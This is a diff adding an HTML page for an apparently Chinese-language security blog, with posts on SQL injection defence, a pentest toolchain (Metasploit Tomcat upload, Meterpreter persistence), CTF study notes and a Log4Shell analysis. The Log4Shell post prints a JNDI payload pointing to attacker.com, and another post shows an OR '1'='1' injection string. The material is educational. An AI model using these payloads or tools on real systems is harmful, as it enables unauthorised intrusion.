@@ -1,0 +1,541 @@
+<!DOCTYPE html>
+<html lang="zh-CN">
+<head>
+<meta charset="UTF-8">
+<meta name="viewport" content="width=device-width, initial-scale=1.0">
+<title>信息安全实验室</title>
+<link rel="preconnect" href="https://fonts.googleapis.com">
+<link rel="preconnect" href="https://fonts.gstatic.com" crossorigin>
+<link href="https://fonts.googleapis.com/css2?family=JetBrains+Mono:wght@400;500;700&family=Noto+Sans+SC:wght@400;500;700&family=Titillium+Web:wght@400;600;700&display=swap" rel="stylesheet">
+<style>
+* { margin: 0; padding: 0; box-sizing: border-box; }
+body {
+  background: #000;
+  color: #fff;
+  font-family: 'Noto Sans SC', -apple-system, 'Segoe UI', sans-serif;
+  line-height: 1.6;
+  min-height: 100vh;
+}
+::-webkit-scrollbar { width: 6px; }
+::-webkit-scrollbar-track { background: #0a0a0f; }
+::-webkit-scrollbar-thumb { background: #00d4ff33; border-radius: 3px; }
+.container { max-width: 900px; margin: 0 auto; padding: 40px 20px; }
+
+/* Scanline overlay */
+.scanline {
+  position: fixed; top: 0; left: 0; width: 100%; height: 100%;
+  pointer-events: none; z-index: 9999;
+  background: repeating-linear-gradient(
+    0deg, transparent, transparent 2px, rgba(0,212,255,0.02) 2px, rgba(0,212,255,0.02) 4px
+  );
+}
+.scanline::after {
+  content: ''; position: absolute; top: -100%; left: 0; width: 100%; height: 5px;
+  background: linear-gradient(0deg, transparent, rgba(0,212,255,0.06), transparent);
+  animation: scan 8s linear infinite;
+}
+@keyframes scan { 0% { top: -5%; } 100% { top: 105%; } }
+
+/* Hero */
+.hero {
+  text-align: center; padding: 60px 0 40px;
+  border-bottom: 1px solid rgba(0,212,255,0.2);
+  margin-bottom: 40px;
+}
+.hero h1 {
+  font-family: 'JetBrains Mono', monospace;
+  font-size: clamp(24px, 5vw, 42px);
+  font-weight: 700;
+  background: linear-gradient(135deg, #00d4ff, #3366ff);
+  -webkit-background-clip: text; -webkit-text-fill-color: transparent;
+  letter-spacing: -0.02em; margin-bottom: 12px;
+}
+.hero .subtitle {
+  font-family: 'JetBrains Mono', monospace;
+  font-size: clamp(12px, 2vw, 15px);
+  color: #8888a0; letter-spacing: 0.08em; margin-bottom: 20px;
+}
+.hero .subtitle span { color: #00d4ff; }
+.hero .tagline {
+  color: #555570; font-size: 14px; font-family: 'JetBrains Mono', monospace;
+  margin-bottom: 8px; letter-spacing: 0.04em;
+}
+.hero .cursor { animation: blink 1s step-end infinite; }
+@keyframes blink { 50% { opacity: 0; } }
+
+/* Tags bar */
+.tags-bar {
+  display: flex; gap: 8px; justify-content: center; flex-wrap: wrap;
+  margin: 16px 0 24px;
+}
+.tag {
+  display: inline-block; padding: 4px 14px; border-radius: 2px;
+  font-family: 'JetBrains Mono', monospace; font-size: 12px; font-weight: 500;
+  letter-spacing: 0.04em; text-transform: uppercase;
+  border: 1px solid; background: transparent; text-decoration: none;
+  transition: all 0.2s ease;
+}
+.tag:hover { transform: translateY(-1px); }
+.tag-cyan { color: #00d4ff; border-color: #00d4ff44; }
+.tag-cyan:hover { background: #00d4ff22; box-shadow: 0 0 12px #00d4ff33; }
+.tag-blue { color: #3366ff; border-color: #3366ff44; }
+.tag-blue:hover { background: #3366ff22; box-shadow: 0 0 12px #3366ff33; }
+.tag-orange { color: #ff6b35; border-color: #ff6b3544; }
+.tag-orange:hover { background: #ff6b3522; box-shadow: 0 0 12px #ff6b3533; }
+.tag-muted { color: #555570; border-color: #55557044; }
+.tag-muted:hover { background: #55557022; }
+.tag-add { color: #8888a0; border-color: #8888a044; border-style: dashed; }
+
+/* Loading bar */
+.loading-bar {
+  display: flex; align-items: center; gap: 12px;
+  font-family: 'JetBrains Mono', monospace; font-size: 12px; color: #555570;
+  margin: 12px 0;
+}
+.loading-track {
+  flex: 1; height: 2px; background: #14141c; position: relative; overflow: hidden;
+}
+.loading-fill {
+  height: 100%; width: 100%;
+  background: linear-gradient(90deg, #00d4ff, #3366ff);
+  animation: loadFill 3s ease-in-out infinite;
+}
+@keyframes loadFill { 0% { width: 0%; } 50% { width: 100%; } 100% { width: 100%; } }
+
+/* Nav */
+.nav {
+  display: flex; gap: 4px; justify-content: center; flex-wrap: wrap;
+  border: 1px solid rgba(255,255,255,0.08);
+  padding: 8px; margin-bottom: 32px; background: #0a0a0f;
+}
+.nav a {
+  font-family: 'JetBrains Mono', monospace; font-size: 13px;
+  color: #8888a0; text-decoration: none; padding: 6px 16px;
+  transition: all 0.2s ease; letter-spacing: 0.04em;
+}
+.nav a:hover, .nav a.active { color: #00d4ff; background: #00d4ff11; }
+
+/* Section title */
+.section-title {
+  font-family: 'Titillium Web', sans-serif;
+  font-size: 20px; font-weight: 600; letter-spacing: 0.1em;
+  color: #00d4ff; margin-bottom: 24px; text-transform: uppercase;
+  border-bottom: 1px solid rgba(0,212,255,0.15); padding-bottom: 8px;
+}
+
+/* Post card */
+.post {
+  background: #0a0a0f;
+  border: 1px solid rgba(255,255,255,0.06);
+  padding: 24px; margin-bottom: 20px;
+  transition: all 0.3s ease;
+}
+.post:hover { border-color: rgba(0,212,255,0.15); }
+.post-date {
+  font-family: 'JetBrains Mono', monospace;
+  font-size: 13px; color: #555570; margin-bottom: 4px;
+}
+.post-title {
+  font-size: clamp(16px, 2.5vw, 20px); font-weight: 700;
+  margin-bottom: 8px;
+}
+.post-title a { color: #fff; text-decoration: none; }
+.post-title a:hover { color: #00d4ff; }
+.post-tags { display: flex; gap: 6px; flex-wrap: wrap; margin-bottom: 12px; }
+.post-tag {
+  display: inline-block; padding: 2px 10px; border-radius: 2px;
+  font-family: 'JetBrains Mono', monospace; font-size: 11px; font-weight: 500;
+  color: #fff; text-decoration: none;
+}
+.post-excerpt { color: #8888a0; font-size: 14px; line-height: 1.7; margin-bottom: 12px; }
+.post-excerpt strong { color: #ccc; }
+.read-more {
+  color: #00d4ff; text-decoration: none; font-size: 13px;
+  font-family: 'JetBrains Mono', monospace; cursor: pointer;
+  transition: all 0.2s ease;
+}
+.read-more:hover { color: #fff; text-shadow: 0 0 8px #00d4ff66; }
+
+/* Post content (collapsible) */
+.post-content {
+  display: none; margin-top: 20px; padding-top: 20px;
+  border-top: 1px solid rgba(255,255,255,0.06);
+}
+.post-content.open { display: block; }
+.post-content h4 {
+  font-family: 'Titillium Web', sans-serif;
+  font-size: 16px; font-weight: 600; color: #3366ff;
+  margin: 20px 0 10px; letter-spacing: 0.05em;
+}
+.post-content p { color: #aaa; font-size: 14px; line-height: 1.7; margin-bottom: 12px; }
+.post-content strong { color: #ddd; }
+.post-content code {
+  background: #14141c; color: #00d4ff; padding: 2px 6px;
+  font-family: 'JetBrains Mono', monospace; font-size: 13px; border-radius: 2px;
+}
+.post-content pre {
+  background: #050508; border: 1px solid #14141c; padding: 16px; overflow-x: auto;
+  margin: 12px 0; border-radius: 2px;
+}
+.post-content pre code { background: none; padding: 0; font-size: 13px; color: #ccc; }
+.post-content table {
+  width: 100%; border-collapse: collapse; margin: 12px 0; font-size: 14px;
+}
+.post-content th, .post-content td {
+  border: 1px solid #14141c; padding: 8px 12px; text-align: left;
+}
+.post-content th { background: #0a0a0f; color: #00d4ff; font-weight: 500; }
+.post-content td { color: #aaa; }
+.post-content ul, .post-content ol { color: #aaa; padding-left: 20px; margin: 8px 0; }
+.post-content li { margin-bottom: 4px; }
+.post-content blockquote {
+  border-left: 2px solid #00d4ff44; padding: 8px 16px; margin: 12px 0;
+  background: #0a0a0f; color: #8888a0; font-size: 14px;
+}
+.post-content blockquote strong { color: #ccc; }
+
+/* Tags index */
+.tags-index {
+  margin-top: 40px; padding: 24px; background: #0a0a0f;
+  border: 1px solid rgba(255,255,255,0.06);
+}
+.tags-index h3 {
+  font-family: 'Titillium Web', sans-serif; font-size: 18px; font-weight: 600;
+  color: #00d4ff; margin-bottom: 16px; letter-spacing: 0.08em; text-transform: uppercase;
+}
+.tag-row {
+  display: flex; justify-content: space-between; align-items: center;
+  padding: 6px 0; border-bottom: 1px solid rgba(255,255,255,0.04);
+  font-family: 'JetBrains Mono', monospace; font-size: 14px;
+}
+.tag-row:last-child { border-bottom: none; }
+.tag-row a { color: #8888a0; text-decoration: none; }
+.tag-row a:hover { color: #00d4ff; }
+.tag-row .count { color: #555570; font-size: 13px; }
+
+/* Template section */
+.template-box {
+  background: #0a0a0f; border: 1px dashed rgba(0,212,255,0.2);
+  padding: 24px; margin: 24px 0;
+}
+.template-box h3 {
+  font-family: 'JetBrains Mono', monospace; font-size: 15px; color: #8888a0; margin-bottom: 12px;
+}
+.template-box pre {
+  background: #050508; padding: 16px; font-family: 'JetBrains Mono', monospace;
+  font-size: 13px; color: #8888a0; overflow-x: auto;
+}
+
+/* Footer */
+.footer {
+  text-align: center; padding: 40px 0;
+  border-top: 1px solid rgba(255,255,255,0.06); margin-top: 40px;
+}
+.footer .brand {
+  font-family: 'JetBrains Mono', monospace; font-size: 14px; color: #555570; margin-bottom: 8px;
+}
+.footer .brand span { color: #00d4ff; }
+.footer .motto { color: #555570; font-size: 13px; margin-bottom: 12px; }
+.footer .links { display: flex; gap: 16px; justify-content: center; flex-wrap: wrap; margin-bottom: 16px; }
+.footer .links a { color: #8888a0; text-decoration: none; font-size: 13px; font-family: 'JetBrains Mono', monospace; }
+.footer .links a:hover { color: #00d4ff; }
+.footer .copy { color: #333; font-size: 12px; font-family: 'JetBrains Mono', monospace; }
+
+@media (max-width: 640px) {
+  .container { padding: 20px 12px; }
+  .post { padding: 16px; }
+  .nav a { font-size: 12px; padding: 4px 10px; }
+  .tags-bar .tag { font-size: 11px; padding: 3px 10px; }
+}
+</style>
+</head>
+<body>
+
+<div class="scanline"></div>
+
+<div class="container">
+
+<div class="hero">
+  <h1>// BLOG : 信息安全实验室</h1>
+  <div class="subtitle">RHODES ISLAND <span>://</span> SECURITY <span>//</span> RESEARCH <span>//</span> EXPLOIT <span>//</span> DEFENSE</div>
+  <div class="tags-bar">
+    <a href="#" class="tag tag-cyan">#漏洞分析</a>
+    <a href="#" class="tag tag-blue">#安全工具</a>
+    <a href="#" class="tag tag-orange">#学习笔记</a>
+    <a href="#" class="tag tag-add">+ 自定义标签</a>
+  </div>
+  <div class="tagline">&gt; 记录信息安全路上的学习、思考与实战。持续更新中 ...</div>
+  <div class="tagline">&gt; LOADING - 100% <span class="cursor">▌</span></div>
+</div>
+
+<div class="nav">
+  <a href="#" class="active">🏠 首页</a>
+  <a href="#">🔍 漏洞分析</a>
+  <a href="#">🛠 安全工具</a>
+  <a href="#">📓 学习笔记</a>
+  <a href="#">🏷 标签归档</a>
+  <a href="#">📬 关于</a>
+</div>
+
+<h2 class="section-title">// LATEST // POSTS</h2>
+
+<!-- Post 1 -->
+<div class="post">
+  <div class="post-date">2026 // 05 / 28</div>
+  <div class="post-title"><a href="#">OWASP Top 10 深度解读：注入攻击 (Injection)</a></div>
+  <div class="post-tags">
+    <span class="post-tag" style="background:#00d4ff22;color:#00d4ff;border:1px solid #00d4ff44">漏洞分析</span>
+    <span class="post-tag" style="background:#3366ff22;color:#3366ff;border:1px solid #3366ff44">OWASP</span>
+    <span class="post-tag" style="background:#ff6b3522;color:#ff6b35;border:1px solid #ff6b3544">Web安全</span>
+  </div>
+  <div class="post-excerpt">
+    注入攻击连续多年位居 OWASP Top 10 榜首。无论是 SQL 注入、NoSQL 注入还是 OS 命令注入，其本质都是 <strong>用户输入被解释器当作代码执行</strong>。本文将深入分析注入攻击的原理、变种及防御方案。
+  </div>
+  <a class="read-more" onclick="togglePost(this)">[ + ] READ MORE</a>
+  <div class="post-content">
+    <h4>攻击原理</h4>
+    <p>当应用程序将不可信的数据作为命令或查询的一部分发送给解释器时，注入漏洞便会产生。攻击者可以构造恶意输入，改变查询的语义。</p>
+    <pre><code>-- 典型的 SQL 注入示例
+SELECT * FROM users WHERE username = 'admin' AND password = '...';
+-- 攻击者输入: admin' OR '1'='1
+SELECT * FROM users WHERE username = 'admin' OR '1'='1' AND password = '...';</code></pre>
+
+    <h4>常见注入类型</h4>
+    <table>
+      <tr><th>类型</th><th>目标解释器</th><th>典型场景</th></tr>
+      <tr><td>SQL 注入</td><td>关系型数据库</td><td>登录绕过、拖库</td></tr>
+      <tr><td>NoSQL 注入</td><td>MongoDB 等</td><td>JSON 查询注入</td></tr>
+      <tr><td>OS 命令注入</td><td>Shell</td><td>Ping 工具、文件处理</td></tr>
+      <tr><td>LDAP 注入</td><td>LDAP 目录服务</td><td>认证绕过</td></tr>
+      <tr><td>XPath 注入</td><td>XML 解析器</td><td>XML 数据窃取</td></tr>
+    </table>
+
+    <h4>防御方案</h4>
+    <ol>
+      <li><strong>参数化查询 (Prepared Statement)</strong> — 最有效的防御手段</li>
+      <li><strong>输入验证 (Input Validation)</strong> — 白名单优于黑名单</li>
+      <li><strong>最小权限原则</strong> — 数据库账号不应使用 DBA 权限</li>
+      <li><strong>输出编码 (Output Encoding)</strong> — 防御二次注入</li>
+    </ol>
+
+    <pre><code># 安全的参数化查询示例 (Python + SQLite)
+import sqlite3
+
+conn = sqlite3.connect('users.db')
+cursor = conn.cursor()
+
+# ❌ 不安全: 字符串拼接
+cursor.execute(f"SELECT * FROM users WHERE name = '{user_input}'")
+
+# ✅ 安全: 参数化查询
+cursor.execute("SELECT * FROM users WHERE name = ?", (user_input,))</code></pre>
+
+    <blockquote><strong>参考</strong>: OWASP Injection | CWE-77 | CWE-89</blockquote>
+  </div>
+</div>
+
+<!-- Post 2 -->
+<div class="post">
+  <div class="post-date">2026 // 05 / 25</div>
+  <div class="post-title"><a href="#">渗透测试工具链：从信息收集到权限维持</a></div>
+  <div class="post-tags">
+    <span class="post-tag" style="background:#00d4ff22;color:#00d4ff;border:1px solid #00d4ff44">安全工具</span>
+    <span class="post-tag" style="background:#3366ff22;color:#3366ff;border:1px solid #3366ff44">渗透测试</span>
+    <span class="post-tag" style="background:#ff6b3522;color:#ff6b35;border:1px solid #ff6b3544">KaliLinux</span>
+  </div>
+  <div class="post-excerpt">
+    一次完整的渗透测试通常遵循 <strong>PTES (Penetration Testing Execution Standard)</strong> 标准流程。本文整理各阶段的核心工具及使用技巧。
+  </div>
+  <a class="read-more" onclick="togglePost(this)">[ + ] READ MORE</a>
+  <div class="post-content">
+    <h4>1. 信息收集 (Reconnaissance)</h4>
+    <table>
+      <tr><th>工具</th><th>用途</th><th>命令示例</th></tr>
+      <tr><td><strong>Nmap</strong></td><td>端口扫描/服务探测</td><td><code>nmap -sV -sC -p- target.com</code></td></tr>
+      <tr><td><strong>dirsearch</strong></td><td>目录爆破</td><td><code>dirsearch -u https://target.com -e php</code></td></tr>
+      <tr><td><strong>Sublist3r</strong></td><td>子域名枚举</td><td><code>sublist3r -d target.com</code></td></tr>
+      <tr><td><strong>theHarvester</strong></td><td>邮箱/域名收集</td><td><code>theHarvester -d target.com -b google</code></td></tr>
+    </table>
+
+    <h4>2. 漏洞扫描 (Vulnerability Scanning)</h4>
+    <pre><code># Nuclei — 基于模板的快速漏洞扫描
+nuclei -u https://target.com -t cves/ -severity critical,high
+
+# Nikto — Web 服务器扫描器
+nikto -h https://target.com -ssl</code></pre>
+
+    <h4>3. 漏洞利用 (Exploitation)</h4>
+    <pre><code># Metasploit 框架使用示例
+msfconsole -q
+msf6 > search tomcat
+msf6 > use exploit/multi/http/tomcat_mgr_upload
+msf6 > set RHOSTS target.com
+msf6 > run</code></pre>
+
+    <h4>4. 权限维持 (Post-Exploitation)</h4>
+    <ul>
+      <li><strong>Meterpreter</strong>: <code>persistence</code> 模块创建后门服务</li>
+      <li><strong>CrackMapExec</strong>: 内网横向移动利器</li>
+      <li><strong>BloodHound</strong>: AD 攻击路径可视化分析</li>
+    </ul>
+
+    <blockquote><strong>原则</strong>: 渗透测试应在获得授权后进行，遵守法律法规及行业规范。</blockquote>
+  </div>
+</div>
+
+<!-- Post 3 -->
+<div class="post">
+  <div class="post-date">2026 // 05 / 20</div>
+  <div class="post-title"><a href="#">CTF 学习笔记：Web 安全入门实战</a></div>
+  <div class="post-tags">
+    <span class="post-tag" style="background:#00d4ff22;color:#00d4ff;border:1px solid #00d4ff44">学习笔记</span>
+    <span class="post-tag" style="background:#3366ff22;color:#3366ff;border:1px solid #3366ff44">CTF</span>
+    <span class="post-tag" style="background:#ff6b3522;color:#ff6b35;border:1px solid #ff6b3544">Web安全</span>
+  </div>
+  <div class="post-excerpt">
+    CTF (Capture The Flag) 是信息安全学习者最好的练兵场。本文梳理 Web 方向的核心题型与解题思路。
+  </div>
+  <a class="read-more" onclick="togglePost(this)">[ + ] READ MORE</a>
+  <div class="post-content">
+    <h4>Web 常见题型速查表</h4>
+    <table>
+      <tr><th>题型</th><th>核心考点</th><th>难度</th></tr>
+      <tr><td><strong>SQL 注入</strong></td><td>参数化查询绕过、报错注入、布尔盲注</td><td>⭐⭐</td></tr>
+      <tr><td><strong>XSS</strong></td><td>反射型/存储型/DOM 型、CSP 绕过</td><td>⭐⭐</td></tr>
+      <tr><td><strong>SSRF</strong></td><td>服务端请求伪造、内网探测</td><td>⭐⭐⭐</td></tr>
+      <tr><td><strong>文件上传</strong></td><td>后缀绕过、.htaccess、PHAR 反序列化</td><td>⭐⭐⭐</td></tr>
+      <tr><td><strong>RCE</strong></td><td>命令注入、模板注入 (SSTI)</td><td>⭐⭐⭐⭐</td></tr>
+      <tr><td><strong>JWT 攻击</strong></td><td>算法混淆、空签名、密钥爆破</td><td>⭐⭐</td></tr>
+      <tr><td><strong>反序列化</strong></td><td>PHP/Python/Java 反序列化利用链</td><td>⭐⭐⭐⭐⭐</td></tr>
+    </table>
+
+    <h4>新手推荐学习路线</h4>
+    <pre><code>基础阶段
+├── HTTP 协议基础 (请求/响应/状态码/Header)
+├── 前端安全基础 (同源策略/CORS/Cookie)
+├── 专业术语库 (Payload/POC/EXP/SHELL)
+└── 实验室环境搭建 (DVWA/Pikachu/SQLi-Labs)
+
+进阶阶段
+├── OWASP Top 10 逐个攻破
+├── 阅读 CVE 漏洞公告
+├── 参加线上 CTF (BugKu / CTFHub / HackTheBox)
+└── 复现经典漏洞 (ThinkPHP/Shiro/Log4j)
+
+实战阶段
+├── 挖 SRC 漏洞 (补天 / 漏洞盒子 / HackerOne)
+├── 撰写漏洞分析文章
+└── 参与护网/攻防演练</code></pre>
+
+    <h4>常用工具速查</h4>
+    <table>
+      <tr><th>工具</th><th>场景</th></tr>
+      <tr><td><strong>Burp Suite</strong></td><td>HTTP 拦截/重放/爆破 (Web 安全必备)</td></tr>
+      <tr><td><strong>HackBar</strong> (Burp 插件)</td><td>快速编解码/SQL 注入辅助</td></tr>
+      <tr><td><strong>CyberChef</strong></td><td>万能编解码/加解密工具</td></tr>
+      <tr><td><strong>sqlmap</strong></td><td>SQL 注入自动化检测与利用</td></tr>
+    </table>
+
+    <blockquote><strong>推荐 CTF 平台</strong>: <a href="https://www.ctfhub.com/" style="color:#00d4ff;">CTFHub</a> · <a href="https://ctf.bugku.com/" style="color:#00d4ff;">BugKu</a> · <a href="https://buuoj.cn/" style="color:#00d4ff;">Buuctf</a> · <a href="https://www.hackthebox.com/" style="color:#00d4ff;">HackTheBox</a> · <a href="https://picoctf.com/" style="color:#00d4ff;">PicoCTF</a></blockquote>
+  </div>
+</div>
+
+<!-- Post 4 -->
+<div class="post">
+  <div class="post-date">2026 // 05 / 15</div>
+  <div class="post-title"><a href="#">从 Log4j 漏洞看供应链安全</a></div>
+  <div class="post-tags">
+    <span class="post-tag" style="background:#00d4ff22;color:#00d4ff;border:1px solid #00d4ff44">漏洞分析</span>
+    <span class="post-tag" style="background:#3366ff22;color:#3366ff;border:1px solid #3366ff44">供应链安全</span>
+    <span class="post-tag" style="background:#ff6b3522;color:#ff6b35;border:1px solid #ff6b3544">CVE</span>
+  </div>
+  <div class="post-excerpt">
+    CVE-2021-44228 (Log4Shell) 是近年来影响最广泛的漏洞之一。一个几乎无处不在的日志库，一个 JNDI 注入，导致了整个互联网的"大地震"。
+  </div>
+  <a class="read-more" onclick="togglePost(this)">[ + ] READ MORE</a>
+  <div class="post-content">
+    <h4>漏洞时间线</h4>
+    <table>
+      <tr><th>时间</th><th>事件</th></tr>
+      <tr><td>2021-11-24</td><td>陈师傅在阿里云安全团队发现漏洞并提交</td></tr>
+      <tr><td>2021-12-09</td><td>漏洞细节公开，引发全球应急响应</td></tr>
+      <tr><td>2021-12-10</td><td>CVSS 评分 10.0 (最高严重等级)</td></tr>
+      <tr><td>2021-12-14</td><td>Apache 发布 Log4j 2.15.0 修复版</td></tr>
+      <tr><td>至今</td><td>持续出现绕过补丁的变种 (2.16.0 → 2.17.0)</td></tr>
+    </table>
+
+    <h4>漏洞原理</h4>
+    <pre><code>${jndi:ldap://attacker.com/exploit}
+  ↑                           ↑
+JNDI 查询                 恶意 LDAP 服务器
+   → 返回恶意 Java 类
+   → 目标服务器执行
+   → 攻击者获得 RCE</code></pre>
+
+    <h4>防御措施</h4>
+    <ol>
+      <li><strong>升级 Log4j 至 2.17.0+</strong></li>
+      <li>设置 JVM 参数: <code>-Dlog4j2.formatMsgNoLookups=true</code></li>
+      <li>使用 WAF 规则拦截 JNDI 注入 Payload</li>
+      <li>建立 SBOM (软件物料清单) 管理供应链风险</li>
+    </ol>
+
+    <blockquote>这个漏洞教会我们：<strong>任何一个开源组件都可能成为整个系统的短板</strong>。</blockquote>
+  </div>
+</div>
+
+<!-- Tags Index -->
+<div class="tags-index">
+  <h3>// TAGS // INDEX</h3>
+  <div class="tag-row"><a href="#">#漏洞分析</a><span class="count">2</span></div>
+  <div class="tag-row"><a href="#">#安全工具</a><span class="count">1</span></div>
+  <div class="tag-row"><a href="#">#学习笔记</a><span class="count">1</span></div>
+  <div class="tag-row"><a href="#">#OWASP</a><span class="count">1</span></div>
+  <div class="tag-row"><a href="#">#CTF</a><span class="count">1</span></div>
+  <div class="tag-row"><a href="#">#Web安全</a><span class="count">2</span></div>
+  <div class="tag-row"><a href="#">#渗透测试</a><span class="count">1</span></div>
+  <div class="tag-row"><a href="#">#供应链安全</a><span class="count">1</span></div>
+  <div class="tag-row"><a href="#">#CVE</a><span class="count">1</span></div>
+  <div class="tag-row"><a href="#">#KaliLinux</a><span class="count">1</span></div>
+  <div class="tag-row"><a href="#" style="color:#555570;">#自定义标签</a><span class="count">— 待添加</span></div>
+</div>
+
+<!-- Template -->
+<div class="template-box">
+  <h3>// TEMPLATE // 如何添加新文章</h3>
+  <pre>&lt;div class="post"&gt;
+  &lt;div class="post-date"&gt;YYYY / MM / DD&lt;/div&gt;
+  &lt;div class="post-title"&gt;&lt;a href="#"&gt;文章标题&lt;/a&gt;&lt;/div&gt;
+  &lt;div class="post-tags"&gt;
+    &lt;span class="post-tag" style="background:#00d4ff22;color:#00d4ff;border:1px solid #00d4ff44"&gt;标签名&lt;/span&gt;
+  &lt;/div&gt;
+  &lt;div class="post-excerpt"&gt;文章摘要 ...&lt;/div&gt;
+  &lt;a class="read-more" onclick="togglePost(this)"&gt;[ + ] READ MORE&lt;/a&gt;
+  &lt;div class="post-content"&gt;正文 ...&lt;/div&gt;
+&lt;/div&gt;</pre>
+</div>
+
+<!-- Footer -->
+<div class="footer">
+  <div class="brand">RHODES ISLAND <span>://</span> SECURITY LAB <span>//</span> BLOG <span>//</span> REV 2.0.1</div>
+  <div class="motto">&gt; 保持好奇 · 保持怀疑 · 保持学习</div>
+  <div class="links">
+    <a href="https://github.com/himobrine/wiki">GitHub</a>
+    <a href="https://github.com/himobrine/wiki">Blog</a>
+    <a href="mailto:user@example.com">Email</a>
+  </div>
+  <div class="copy">(c) 2026 // SECURITY BLOG // ALL RIGHTS RESERVED</div>
+</div>
+
+</div>
+
+<script>
+function togglePost(el) {
+  const content = el.nextElementSibling;
+  content.classList.toggle('open');
+  el.textContent = content.classList.contains('open') ? '[ - ] CLOSE' : '[ + ] READ MORE';
+}
+</script>
+
+</body>
+</html>
